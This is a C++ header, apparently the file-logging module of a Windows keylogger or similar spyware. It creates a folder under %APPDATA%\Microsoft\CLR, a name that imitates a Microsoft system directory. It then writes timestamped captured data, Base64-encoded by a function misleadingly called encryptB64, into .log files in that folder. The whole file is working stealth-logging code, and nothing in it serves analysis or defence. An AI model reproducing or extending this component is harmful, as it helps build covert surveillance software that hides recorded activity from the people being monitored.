#ifndef IO_H_INCLUDED
#define IO_H_INCLUDED

#include <string>
#include <cstdlib>
#include <fstream>
#include "../../x86_64-w64-mingw32/include/windows.h"
#include "helper.h"
#include "base64.h"

using namespace std;

namespace IO {
    //gets the path of where the log is going to be stored
    string GetOurPath(const bool append_separator = false) {
        string appdata_dir(getenv("APPDATA"));
        string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");

    }

    //creates the directory
    bool MkOneDr(const string &path) {
        return (bool) CreateDirectory(path.c_str(), nullptr) ||
               GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(string path) {
        // for-loop to go thru the string
        for (char &c : path) {
            if (c == '\\') {
                c = '\0';
                if (!MkOneDr(path)) {
                    return false;
                }
                c = '\\';
            }
        }
        return true;
    }

    template<class T>
    string WriteLog(const T &t) {
        string path = GetOurPath(true);
        Helper::DateTime date;
        string name = date.GetDateTimeString("_") + ".log";

        try {
            ofstream file(path + name);
            if (!file) return "";
            ostringstream s;

            s << "[" << date.GetDateTimeString() << "]" << endl << t << endl;
            string data = Base64::encryptB64(s.str());

            file << data;

            if (!file) {
                return "";
            }

            file.close();
            return name;
        }
        catch (const std::exception &e) {
            return e.what();
        }
    }
}

#endif // IO_H_INCLUDED